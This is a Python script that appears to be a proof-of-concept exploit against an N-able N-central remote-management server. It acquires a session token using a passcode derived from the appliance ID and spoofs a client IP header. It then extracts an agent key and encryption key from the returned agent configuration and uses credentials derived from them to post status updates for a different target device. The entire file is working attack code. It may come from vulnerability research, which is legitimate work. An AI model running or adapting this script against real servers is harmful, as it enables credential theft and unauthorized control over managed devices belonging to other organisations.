#!/usr/bin/env python3
import argparse
import base64
import hashlib
import json
import os
import re
import uuid
import xml.etree.ElementTree as ET

import requests
import urllib3


SOAP = "http://www.w3.org/2003/05/soap-envelope"
MMS = "http://mms3.nobj.nable.com/"


def wrap(inner):
    return f'<soap:Envelope xmlns:soap="{SOAP}" xmlns:m="{MMS}"><soap:Body>{inner}</soap:Body></soap:Envelope>'


def returned(body, operation):
    return ET.fromstring(body).findtext(f'.//{{*}}{operation}Response/{{*}}return') or ""


def jwt_id(token):
    value = token.split(".")[1]
    value += "=" * (-len(value) % 4)
    return json.loads(base64.urlsafe_b64decode(value))["jti"]


def command_line(body):
    for item in ET.fromstring(body).iter():
        if item.tag.rsplit("}", 1)[-1] != "return":
            continue
        children = list(item)
        key = next((child.text or "" for child in children if child.tag.rsplit("}", 1)[-1] == "Key1"), "")
        if key != "ECO_AGENT_CFG":
            continue
        for group in children:
            if group.tag.rsplit("}", 1)[-1] != "ComplexValues":
                continue
            row = {child.tag.rsplit("}", 1)[-1]: child.text or "" for child in group}
            if row.get("Key1") == "Executioner.1.commandLine":
                return row.get("Values", "")
    raise RuntimeError("ECO_AGENT_CFG command line was not returned")


def command_arg(command, name):
    match = re.search(r"/" + re.escape(name) + r"=([^\s]+)", command, re.I)
    if not match:
        raise RuntimeError(f"/{name} is missing")
    return match.group(1).strip("\"'")


def acknowledgement(response):
    try:
        values = response.json()
    except Exception:
        return "", ""
    props = {
        prop.get("name"): prop.get("value")
        for entity in values if isinstance(values, list)
        for prop in entity.get("dataProperties", [])
    }
    return str(props.get("messageStatus", "")), str(props.get("messageErrorCode", ""))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--origin", default="https://n-central.local")
    parser.add_argument("--appliance-id", type=int, default=1177049630)
    parser.add_argument("--target-agent-id", required=True)
    parser.add_argument("--target-device-id", required=True)
    parser.add_argument("--version", required=True)
    parser.add_argument("--proxy", default=os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY"))
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    http = requests.Session()
    http.verify = False
    http.trust_env = False
    if args.proxy:
        http.proxies.update({"http": args.proxy, "https": args.proxy})
    soap_url = args.origin.rstrip("/") + "/dms2/services2/ServerMMS3"

    def post(inner, token=None, session_id=None):
        headers = {"Content-Type": "application/soap+xml; charset=UTF-8", "X-Forwarded-For": "192.168.1.145"}
        if token:
            headers["Authorization"] = "Bearer " + token
        if session_id:
            headers["X-Session-Id"] = str(session_id)
        return http.post(soap_url, data=wrap(inner), headers=headers, timeout=45)

    appliance = str(args.appliance_id)
    acquired = post(
        f'<m:AcquireToken><m:applianceId>{appliance}</m:applianceId>'
        f'<m:passcode>{hashlib.sha256(appliance.encode()).hexdigest()}</m:passcode>'
        f'<m:hardwareId>{uuid.uuid4()}</m:hardwareId></m:AcquireToken>'
    )
    acquired.raise_for_status()
    token = returned(acquired.content, "AcquireToken")
    post(f'<m:ConfirmTokenReceived><m:jwtId>{jwt_id(token)}</m:jwtId></m:ConfirmTokenReceived>').raise_for_status()
    hello = post(
        '<m:SessionHello><m:version>2.0.0</m:version><m:applianceVersion>1.0.0.0</m:applianceVersion>'
        '<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>'
        '<m:timeZoneID>-05:00</m:timeZoneID></m:SessionHello>', token
    )
    hello.raise_for_status()
    session_id = returned(hello.content, "SessionHello")
    print(f"acquire_http={acquired.status_code} session_received={str(bool(session_id)).lower()}")
    try:
        config = post('<m:ApplianceGetConfig><m:configTypes>ECO_AGENT_CFG</m:configTypes></m:ApplianceGetConfig>', token, session_id)
        config.raise_for_status()
        command = command_line(config.content)
        agent_key = command_arg(command, "agentkey")
        encryption_key = command_arg(command, "enckey")
        owner_device = command_arg(command, "agentid")
        material = agent_key.lower() + "_" + encryption_key.lower()
        password_hash = base64.b64encode(hashlib.sha256(material.encode()).digest()).decode()
        valid = base64.b64encode((agent_key + ":" + password_hash).encode()).decode()
        invalid = base64.b64encode(b"invalid:invalid").decode()
        body = [{
            "resourceName": "ecosystemIntegrationComponentStatus",
            "dataProperties": [
                {"name": "deviceId", "value": args.target_device_id},
                {"name": "integrationId", "value": "SWMSP_ECOSYSTEM_AGENT"},
                {"name": "ecosystemAgentId", "value": args.target_agent_id},
                {"name": "version", "value": args.version},
            ],
        }]
        endpoint = args.origin.rstrip("/") + ":8443/dms/rest/ecosystem-shim/ecosystem-agent-component-status"
        print(f"credential_owner_device={owner_device}")
        for label, credential in (("missing", None), ("invalid", invalid), ("valid", valid)):
            headers = {"EncryptedString": credential} if credential else {}
            response = http.post(endpoint, json=body, headers=headers, timeout=30)
            status, error = acknowledgement(response)
            print(f"{label}_http={response.status_code} message_status={status} error={error}")
    finally:
        post('<m:SessionQuit><m:shutdown>false</m:shutdown></m:SessionQuit>', token, session_id)


if __name__ == "__main__":
    main()
